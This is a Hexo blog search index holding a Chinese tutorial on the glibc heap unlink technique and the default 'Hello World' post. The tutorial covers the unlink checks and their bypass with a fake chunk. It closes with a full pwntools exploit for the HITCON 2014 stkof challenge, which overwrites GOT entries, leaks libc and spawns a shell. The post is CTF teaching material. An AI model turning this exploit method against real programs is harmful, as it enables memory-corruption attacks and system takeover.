<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Unlink</title>
    <url>/2025/06/17/Unlink%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="一、-Unlink介绍"><a href="#一、-Unlink介绍" class="headerlink" title="一、 Unlink介绍"></a>一、 Unlink介绍</h1><p>Unlink被定义为一个宏（高版本libc中被定义为了静态函数 <code>unlink_chunk</code>)，其源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 从双向链表中安全移除节点P的宏</span></span><br><span class="line"><span class="comment"> * AV: 分配区指针，用于错误处理</span></span><br><span class="line"><span class="comment"> * P: 要移除的节点指针</span></span><br><span class="line"><span class="comment"> * BK: 临时存储后驱节点指针</span></span><br><span class="line"><span class="comment"> * FD: 临时存储前驱节点指针</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">/* 获取P的前驱和后继节点 */</span>                                      </span><br><span class="line">    FD = P-&gt;fd;								      </span><br><span class="line">    BK = P-&gt;bk;								      </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">    <span class="keyword">else</span> &#123;								      </span><br><span class="line">        <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">        FD-&gt;bk = BK;							      </span><br><span class="line">        BK-&gt;fd = FD;							      </span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">            <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">	      malloc_printerr (check_action,				      </span><br><span class="line">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">			       P, AV);					      </span><br><span class="line">            </span><br><span class="line">            <span class="comment">/* 如果后继节点的大小链表指针为空，需要重建 */</span>      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      </span><br><span class="line">                <span class="comment">/* 情况1：P是唯一节点，让后继节点自环 */</span>      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      </span><br><span class="line">                <span class="comment">/* 情况2：将P的大小链表指针转移给后继节点 */</span></span><br><span class="line">                <span class="keyword">else</span> &#123;							      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD; <span class="comment">/* 更新后节点的后驱 */</span>      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD; <span class="comment">/* 更新前节点的前驱 */</span>      </span><br><span class="line">                  &#125;							      </span><br><span class="line">              &#125; </span><br><span class="line">            <span class="comment">/* 如果后继已有大小链表指针，直接跳过P */</span>      </span><br><span class="line">            <span class="keyword">else</span> &#123;							      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      </span><br><span class="line">              &#125;								      </span><br><span class="line">          &#125;								      </span><br><span class="line">      &#125;									      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Unlink是堆管理中的一个操作，用于将一个chunk从<strong>双向链表</strong>中取出。触发unlink，往往是通过free物理相邻的下一块chunk，检查到该chunk的上一块处于free状态（size的prev_inuse为0)，就用unlink将上一块脱链后合并。</p>
<p>实现过程如下图。（图画的丑陋，别喷）<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011235981.png" alt="image-20250617011235981"><br>当我们执行Unlink将chunk2从双向链表中取出的时候，这个双向链表就变成下面这个样子。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011244292.png" alt="image-20250617011244292"></p>
<p><strong>漏洞点：</strong> 如果我们可以伪造chunk2，通过<strong>控制fd和bk的值</strong>，我们似乎就可以实现任意地址写。<br>但是事情并非如此简单，通过上面给出的源码可以看到，Unlink内部做了许多保护和限制，下面我们就来研究这些保护以及限制。</p>
<h1 id="二、-保护和限制"><a href="#二、-保护和限制" class="headerlink" title="二、 保护和限制"></a>二、 保护和限制</h1><h2 id="1-chunksize-P-prev-size-next-chunk-P"><a href="#1-chunksize-P-prev-size-next-chunk-P" class="headerlink" title="1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))"></a>1. chunksize(P) &#x3D;&#x3D; prev_size(next_chunk(P))</h2><p>这部分检测源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 获取下一个块的指针 */</span></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"><span class="comment">/* 检查下一个块的prev_size是否等于当前块size */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;prev_size != size, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这部分检测检查的是下一个chunk的prev_size是否和当前堆块的prev_size相等（这是free函数中的检测）</p>
</blockquote>
<h2 id="2-fd-bk-P-bk-fd-P"><a href="#2-fd-bk-P-bk-fd-P" class="headerlink" title="2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P"></a>2. fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; bk -&gt; fd &#x3D;&#x3D; P</h2><p>这部分检测源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 验证前后节点指针的完整性：前驱的后继和后继的前驱必须都指向P */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      </span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 链表完整性验证通过，执行移除操作 */</span>      </span><br><span class="line">  <span class="keyword">else</span> &#123;								      </span><br><span class="line">      <span class="comment">/* 基本链表操作：让前驱和后继互相指向，跳过P */</span>  </span><br><span class="line">      FD-&gt;bk = BK;							      </span><br><span class="line">      BK-&gt;fd = FD;							     </span><br></pre></td></tr></table></figure>
<p>其实就是在检测这个双向链表的结构是否完整。</p>
<h2 id="3-not-small"><a href="#3-not-small" class="headerlink" title="3. not small"></a>3. not small</h2><p>这部分检测源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 处理非small bin的特殊情况（large bins可能有额外的大小链表） */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      </span><br><span class="line">          &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      </span><br><span class="line">          <span class="comment">/* 检查大小链表的完整性 */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">     malloc_printerr (check_action,				      </span><br><span class="line">	       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">	       P, AV);					      </span><br></pre></td></tr></table></figure>
<p>简单来说，如果chunk的大小落在largebin范围内，就会进行对nextsize的检查</p>
<h1 id="三、-适用场景及绕过方法"><a href="#三、-适用场景及绕过方法" class="headerlink" title="三、 适用场景及绕过方法"></a>三、 适用场景及绕过方法</h1><h3 id="适用场景（一般来说）"><a href="#适用场景（一般来说）" class="headerlink" title="适用场景（一般来说）"></a>适用场景（一般来说）</h3><ol>
<li>有一个list专门用于存户malloc得到的指针</li>
<li>存在溢出漏洞</li>
</ol>
<h3 id="保护绕过（以上面讲的适用场景为例）"><a href="#保护绕过（以上面讲的适用场景为例）" class="headerlink" title="保护绕过（以上面讲的适用场景为例）"></a>保护绕过（以上面讲的适用场景为例）</h3><p><strong>保护1</strong><br>通过<strong>溢出</strong>，对下一个堆块进行修改，使得下一个堆块的<strong>prev_size &#x3D; fackchcunk的size，prev_inuse &#x3D; 0</strong><br><strong>保护2</strong><br>对于保护2，可以通过构造facck chunk来绕过。<br>chunk_list存在的时候，我们做以下构造<br>fack chunk的fd指向 存放当前堆块指针的地址 -0x18（bk指针相对于chunk头的偏移是0x18)<br>fack chunk的bk指向 存放当前堆块指针的地址 -0x10（fd指针相对于chunk头的偏移是0x10)<br>这样就实现了 fack_chunk的fd指向的“chunk”的bk指向它，fack_chunk的bk指向的“chunk”指向它，从而成功绕过检测。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fakeFD -&gt; bk == P1 *(&amp;fakeFD + <span class="number">0x18</span>) == P1 *fakeFD == &amp;P1 - <span class="number">0x18</span></span><br><span class="line">fakeBK -&gt; fd == P1 *(&amp;fakeBK + <span class="number">0x10</span>) == P1 *fakeBK == &amp;P1 - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
<p><strong>保护3</strong><br>更简单了，直接不申请largebin大小的chunk即可。</p>
<h1 id="四、-例题分析"><a href="#四、-例题分析" class="headerlink" title="四、 例题分析"></a>四、 例题分析</h1><p>题目来源：<a href="https://wwyq.lanzouo.com/imJ0k2qa2ykf" title="[2014_hitccon_stkof]">[2014_hitccon_stkof]</a><br>先检查一下保护，看一下文件的ELF信息</p>
<p>可以看到是64位小端序，开启了canary和nx，got表可写<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617005504217.png" alt="image-20250617005504217"></p>
<p>丢到ida里面看一看（为了方便查看，改了一些函数和变量的名字）<br>main函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011402635.png" alt="image-20250617011402635"></p>
<p>creat函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011426223.png" alt="image-20250617011426223"></p>
<p>delete函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011434419.png" alt="image-20250617011434419"></p>
<p>edit函数<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011440515.png" alt="image-20250617011440515"></p>
<p>还有一个没什么用的函数，这里就不管他了。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011446181.png" alt="image-20250617011446181"></p>
<p>通过分析程序的主要函数，我们发现申请的堆块的指针都在存放在bss段的一个数组（后面叫做list）中，并且edit函数输入的字节数目由我们自己控制，所以存在溢出。所以这道题可以用unlink来做。<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011454200.png" alt="image-20250617011454200"><br><strong>前置准备：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choicce</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choicce).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br></pre></td></tr></table></figure>
<p>所以思路就很清晰了：<br>我们先申请四个堆块（第一个用后续操作，第二个就是我们用来制作fack chunk的，第三个用来触发unlink，堆块四用来chunk防止与top chunk合并）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 1</span></span><br><span class="line">   </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment"># 3</span></span><br><span class="line">   </span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment"># 4</span></span><br></pre></td></tr></table></figure>

<p>然后通过edit第二个堆块来<strong>制造fack chunk并溢出到第三个堆块，修改他的prev_size和prev_inuse</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunks =  <span class="number">0x602140</span></span><br><span class="line">aim = chunks + <span class="number">0x10</span><span class="comment">#chunk2_addr</span></span><br><span class="line">fd = aim - <span class="number">0x18</span></span><br><span class="line">bk = aim - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_chunk</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x90</span>,payload1)</span><br></pre></td></tr></table></figure>
<p>此时，chunk2内存是这样的<br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011501083.png" alt="image-20250617011501083"></p>
<p>接着<strong>free第三个堆块触发unlink</strong>，这个时候原来存放第二个堆块的指针(list[2])的位置就被写入了 <strong>&amp;list -0x8</strong><br><img src="/Unlink%E8%AF%A6%E8%A7%A3/image-20250617011508665.png" alt="image-20250617011508665"></p>
<p>后面我们就可以通过edit堆块2去修改list中存放的值，我们将chunk_list[1]、chunk_list[2]、chunk_list[3]的值分别改为free、puts、atoi的got表地址<br>然后通过edit堆块1，实现修改free_got为 puts_plt ，然后free堆块2就能泄露puts函数的真实地址，据此算出libc_base<br>然后edit堆块3将atoi_got改为system的地址，最后输入<code>/bin/sh</code>就能getshell</p>
<p>完整的exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span> , os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_remote = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (remote):</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26221</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pwnfile)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choicce</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choicce).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    chunks =  <span class="number">0x602140</span></span><br><span class="line">    aim = chunks + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    fd = aim - <span class="number">0x18</span></span><br><span class="line">    bk = aim - <span class="number">0x10</span></span><br><span class="line">    </span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    fread_got = elf.got[<span class="string">&#x27;fread&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">   </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>)<span class="comment">#</span></span><br><span class="line">   </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#fake_chunk</span></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x90</span>,payload1)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(free_got) + p64(puts_got) + p64(atoi_got) </span><br><span class="line">    edit( <span class="number">2</span> , <span class="built_in">len</span>(payload2) , payload2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    edit( <span class="number">1</span> , <span class="number">0x8</span> , p64(puts_plt))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;OK\n&#x27;</span>)</span><br><span class="line">    edit( <span class="number">3</span> , <span class="number">0x8</span> , p64(system_addr))</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/06/17/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>test</category>
      </categories>
      <tags>
        <tag>t1</tag>
        <tag>t2</tag>
      </tags>
  </entry>
</search>
